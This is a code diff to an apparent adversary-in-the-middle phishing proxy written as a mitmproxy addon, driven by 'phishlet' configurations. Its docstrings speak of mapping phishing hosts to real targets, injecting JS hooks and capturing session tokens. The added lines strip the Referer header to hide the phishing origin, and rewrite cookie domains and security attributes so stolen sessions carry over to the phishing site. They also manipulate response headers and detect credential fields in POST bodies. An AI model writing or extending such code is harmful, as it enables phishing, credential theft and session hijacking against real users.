@@ -36,6 +36,7 @@ class VantaInterceptor:
         1. Identify session (cookie/path)
         2. Map host (phishing -> target)
         3. Strip indicators (referer)
+        4. Path rewrites & blocklist
         """
         host = flow.request.pretty_host
         
@@ -51,6 +52,34 @@ class VantaInterceptor:
                 self.logger.debug(f"Rewrote host: {host} -> {target_host}")
                 break
         
+        # Remove potentially leaking headers
+        if "referer" in flow.request.headers:
+            del flow.request.headers["referer"]
+
+        # Blocklist resources early
+        try:
+            url = getattr(flow.request, "pretty_url", "") or getattr(flow.request, "path", "")
+            for rule in getattr(self.phishlet, "blocklist", []):
+                if re.search(rule.pattern, url):
+                    self.logger.info(f"Blocking resource by rule: {rule.pattern}")
+                    if hasattr(http, "Response"):
+                        flow.response = http.Response.make(204, b"", {"content-type": "text/plain"})
+                    return
+        except Exception:
+            pass
+
+        # Path rewrites
+        try:
+            path = getattr(flow.request, "path", "")
+            method = getattr(flow.request, "method", "GET")
+            for rule in getattr(self.phishlet, "path_rewrites", []):
+                if method in rule.methods and re.search(rule.pattern, path):
+                    new_path = re.sub(rule.pattern, rule.replace, path)
+                    self.logger.debug(f"Rewrote path: {path} -> {new_path}")
+                    flow.request.path = new_path
+        except Exception:
+            pass
+
         # Capture Credentials (POST)
         if flow.request.method == "POST":
             self._scan_for_credentials(flow)
@@ -61,6 +90,7 @@ class VantaInterceptor:
         1. Map host (target -> phishing) in Location/Cookies
         2. Inject JS hooks
         3. Capture session tokens
+        4. Header & Cookie rewrite rules
         """
         # 1. Rewrite Location headers
         if "Location" in flow.response.headers:
@@ -72,6 +102,36 @@ class VantaInterceptor:
         # 2. Capture Set-Cookie
         self._scan_for_tokens(flow)
 
+        # 2b. Apply cookie rewrite rules
+        try:
+            for rule in getattr(self.phishlet, "cookie_rewrites", []):
+                if rule.name in flow.response.cookies:
+                    value, attrs = flow.response.cookies[rule.name]
+                    if rule.domain_to:
+                        attrs["domain"] = rule.domain_to
+                    if rule.path_to:
+                        attrs["path"] = rule.path_to
+                    if rule.samesite:
+                        attrs["samesite"] = rule.samesite
+                    if rule.secure is not None:
+                        attrs["secure"] = rule.secure
+                    flow.response.cookies[rule.name] = (value, attrs)
+        except Exception:
+            pass
+
+        # 2c. Header rules
+        try:
+            for hr in getattr(self.phishlet, "headers", []):
+                name = hr.name
+                action = hr.action.lower()
+                if action == "remove":
+                    if name in flow.response.headers:
+                        del flow.response.headers[name]
+                elif action == "set" and hr.value is not None:
+                    flow.response.headers[name] = hr.value
+        except Exception:
+            pass
+
         # 3. Inject Content
         if flow.response.content:
             self._inject_scripts(flow)
@@ -79,13 +139,12 @@ class VantaInterceptor:
     def _scan_for_credentials(self, flow: http.HTTPFlow):
         """Analyze POST body for defined credential fields"""
         try:
-            content = flow.request.text
-            # Simple form-data parsing (should be robustified)
-            # This is a placeholder for the actual regex logic from PhishletConfig
+            content = flow.request.get_text(strict=False) if hasattr(flow.request, "get_text") else flow.request.text
             for rule in self.phishlet.credentials:
-                if rule.type == "post_param":
-                    # Check if param exists in content
-                    pass
+                if rule.type == "post_param" and rule.name:
+                    if re.search(rf"(?:^|&){re.escape(rule.name)}=", content):
+                        self.logger.info(f"Detected credential param: {rule.name}")
+                        # TODO: capture and store via session_manager
         except Exception:
             pass
 
